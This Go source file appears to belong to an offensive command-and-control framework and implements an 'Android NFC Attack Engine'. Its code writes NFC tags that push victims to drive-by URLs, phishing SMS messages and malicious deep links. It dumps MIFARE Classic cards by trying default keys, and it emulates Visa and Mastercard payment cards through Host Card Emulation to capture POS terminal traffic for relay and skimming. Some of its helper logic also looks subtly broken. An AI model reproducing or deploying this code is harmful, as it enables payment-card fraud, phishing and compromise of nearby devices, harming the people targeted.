// //go:build android

package hardware

/*
	SUDOSOC-C2 — Android NFC Attack Engine
	Copyright (C) 2026  sudosoc — Seif

	NFC (Near Field Communication) exploitation for Android.

	Attack vectors:
	1. NDEF Payload Attack
	   Write malicious NDEF data to NFC tags.
	   When victim's phone scans the tag:
	   → Launches URL in browser → drive-by payload
	   → Triggers deep link → opens app with malicious intent
	   → Opens SMS with pre-filled phishing message

	2. HCE (Host Card Emulation) — Card Skimming
	   Android can emulate a contactless payment card.
	   Our implant registers itself as a payment card (HCE):
	   → When placed near POS terminal → captures AID + APDU
	   → Can relay to real card (relay attack)
	   → Can intercept payment data

	3. NFC Beaming (Android Beam / NDEF Push)
	   Send files or intents to nearby NFC-enabled Android devices.
	   → Used for proximity-based payload delivery

	4. NFC Data Exchange (P2P)
	   Peer-to-peer communication between two Android devices.
	   → Short-range C2 when BLE is not available

	Operational range: 0-10 cm (must be very close to target/reader)
*/

import (
	"encoding/hex"
	"fmt"
	"os/exec"
	"strings"
)

// NDEFRecord types
const (
	NDEFTypeURI  = "U"
	NDEFTypeText = "T"
	NDEFTypeMIME = "M"
	NDEFTypeSP   = "Sp" // SmartPoster
)

// NDEFRecord represents a single NDEF record
type NDEFRecord struct {
	Type    string
	Payload []byte
}

// NFCAttack manages NFC-based attacks
type NFCAttack struct {
	InterfacePath string // /dev/nfc0 or similar
}

// NewNFCAttack creates a new NFC attack handler
func NewNFCAttack() *NFCAttack {
	return &NFCAttack{
		InterfacePath: detectNFCInterface(),
	}
}

// ── NDEF Tag Writing ──────────────────────────────────────────────

// WriteURITag writes a URL to an NFC tag
// When victim scans: opens URL in browser → drive-by attack
func (n *NFCAttack) WriteURITag(url, tagDevice string) error {
	// Use nfc-mfclassic or libnfc tools
	ndefData := buildURINDEF(url)
	hexStr := hex.EncodeToString(ndefData)

	// Try nfc-write (requires libnfc)
	err := exec.Command("nfc-write", tagDevice, "--ndef", hexStr).Run()
	if err == nil {
		return nil
	}

	// Try Android NDEFFormater approach via shell
	return n.writeViaAndroid(url, "uri")
}

// WriteSMSTag writes an SMS intent to an NFC tag
// When victim scans: opens SMS app with pre-filled phishing message
func (n *NFCAttack) WriteSMSTag(number, message, tagDevice string) error {
	smsURI := fmt.Sprintf("sms:%s?body=%s", number,
		strings.ReplaceAll(message, " ", "%20"))
	return n.WriteURITag(smsURI, tagDevice)
}

// WriteDeepLinkTag writes an Android deep link to trigger app behavior
func (n *NFCAttack) WriteDeepLinkTag(scheme, host, path string) error {
	deepLink := fmt.Sprintf("%s://%s%s", scheme, host, path)
	return n.writeViaAndroid(deepLink, "uri")
}

func (n *NFCAttack) writeViaAndroid(payload, payloadType string) error {
	// Use am startservice with NFC write intent
	cmd := exec.Command("am", "startservice",
		"-a", "android.nfc.action.TAG_DISCOVERED",
		"--es", "payload", payload,
		"--es", "type", payloadType)
	return cmd.Run()
}

// ── NFC Tag Reading ───────────────────────────────────────────────

// NFCTagData holds data read from an NFC tag
type NFCTagData struct {
	TagType    string   // MIFARE Classic, NDEF, etc.
	UID        string   // tag UID
	Size       int      // memory size in bytes
	Records    []string // NDEF records
	RawData    []byte   // raw memory dump (for MIFARE)
	IsWritable bool
}

// ReadTag reads data from an NFC tag
func (n *NFCAttack) ReadTag() (*NFCTagData, error) {
	// Use nfc-read or nfc-poll
	out, err := exec.Command("nfc-poll", "-t", "3").Output()
	if err != nil {
		return nil, fmt.Errorf("NFC poll failed: %v", err)
	}

	tag := &NFCTagData{}

	for _, line := range strings.Split(string(out), "\n") {
		if strings.Contains(line, "UID:") {
			tag.UID = strings.TrimSpace(strings.TrimPrefix(line, "UID:"))
		}
		if strings.Contains(line, "Type:") {
			tag.TagType = strings.TrimSpace(strings.TrimPrefix(line, "Type:"))
		}
	}

	return tag, nil
}

// DumpMIFARE dumps the full content of a MIFARE Classic card
func (n *NFCAttack) DumpMIFARE(outputFile string) error {
	// Try default MIFARE keys first
	defaultKeys := []string{"FFFFFFFFFFFF", "A0A1A2A3A4A5", "D3F7D3F7D3F7"}

	for _, key := range defaultKeys {
		cmd := exec.Command("nfc-mfclassic",
			"r", "a", key, outputFile)
		if cmd.Run() == nil {
			return nil
		}
	}
	return fmt.Errorf("MIFARE dump failed — try additional keys")
}

// ── HCE Card Emulation (Contact Card Skimming) ───────────────────

// HCEConfig configures Host Card Emulation
type HCEConfig struct {
	AID        string // Application Identifier (e.g., "A0000000031010" for Visa)
	CardNumber string // emulated card number
	CVV        string
	Expiry     string
}

// HCEEmulatorInfo returns information about setting up HCE
// (Actual HCE requires APK registration in AndroidManifest.xml)
func HCEEmulatorInfo() string {
	return `
NFC HCE (Host Card Emulation) Setup
=====================================
HCE allows our implant to emulate a contactless payment card.

AndroidManifest.xml registration required:
<service
    android:name=".PhantomHCEService"
    android:exported="true"
    android:permission="android.permission.BIND_NFC_SERVICE">
    <intent-filter>
        <action android:name="android.nfc.cardemulation.action.HOST_APDU_SERVICE"/>
    </intent-filter>
    <meta-data
        android:name="android.nfc.cardemulation.host_apdu_service"
        android:resource="@xml/hce_config"/>
</service>

hce_config.xml:
<host-apdu-service xmlns:android="http://schemas.android.com/apk/res/android"
    android:description="@string/service_name"
    android:requireDeviceUnlock="false">
    <aid-group android:description="@string/card"
               android:category="payment">
        <aid-filter android:name="A0000000031010"/>  <!-- Visa -->
        <aid-filter android:name="A0000000041010"/>  <!-- Mastercard -->
    </aid-group>
</host-apdu-service>

Once registered:
  → Device behaves like a contactless payment card
  → Captures APDU commands from POS terminals
  → Can relay to legitimate card (relay attack)
  → Can log all payment session data

Requires: The user taps their device on a POS terminal
          Social engineering: "Tap here to pay"
`
}

// ProcessAPDUCommand processes an APDU command from a POS terminal
func ProcessAPDUCommand(apdu []byte) []byte {
	// APDU processing for payment card emulation
	// Returns simulated card response

	if len(apdu) < 4 {
		return []byte{0x6F, 0x00} // File not found
	}

	cla := apdu[0]
	ins := apdu[1]
	_ = cla

	switch ins {
	case 0xA4: // SELECT FILE
		// Respond with FCI (File Control Information) for Visa
		return buildSelectResponse()
	case 0xB2: // READ RECORD
		return buildReadRecordResponse()
	case 0x80: // GET PROCESSING OPTIONS
		return buildGPOResponse()
	default:
		return []byte{0x69, 0x86} // Command not allowed
	}
}

func buildSelectResponse() []byte {
	// Minimal FCI for Visa credit card
	return []byte{
		0x6F, 0x1E,
		0x84, 0x07, 0xA0, 0x00, 0x00, 0x00, 0x03, 0x10, 0x10, // AID
		0xA5, 0x13,
		0x50, 0x04, 'V', 'I', 'S', 'A', // Label
		0x9F, 0x38, 0x03, 0x9F, 0x21, 0x01, // PDOL
		0x90, 0x00, // SW1 SW2 - Success
	}
}

func buildReadRecordResponse() []byte {
	return []byte{0x70, 0x00, 0x90, 0x00}
}

func buildGPOResponse() []byte {
	return []byte{0x80, 0x06, 0x00, 0x00, 0x08, 0x01, 0x00, 0x00, 0x90, 0x00}
}

// ── Helpers ──────────────────────────────────────────────────────

func detectNFCInterface() string {
	interfaces := []string{
		"/dev/nfc0",
		"/dev/pn544",
		"/dev/bcm2079x",
		"/dev/nq-nci",
	}
	for _, iface := range interfaces {
		if out, _ := exec.Command("test", "-e", iface).Output(); len(out) == 0 {
			return iface
		}
	}
	return "/dev/nfc0" // default
}

func buildURINDEF(uri string) []byte {
	// NDEF URI record format
	uriAbbrPrefix := byte(0x03) // https://
	if strings.HasPrefix(uri, "http://") {
		uriAbbrPrefix = 0x03
		uri = strings.TrimPrefix(uri, "http://")
	} else if strings.HasPrefix(uri, "https://") {
		uriAbbrPrefix = 0x04
		uri = strings.TrimPrefix(uri, "https://")
	} else {
		uriAbbrPrefix = 0x00 // no abbreviation
	}

	payload := append([]byte{uriAbbrPrefix}, []byte(uri)...)

	// NDEF record header
	// MB=1, ME=1, SR=1, TNF=1 (Well Known), TYPE=U
	header := byte(0xD1)
	typeLen := byte(1)
	payloadLen := byte(len(payload))
	recType := byte('U')

	return append([]byte{header, typeLen, payloadLen, recType}, payload...)
}
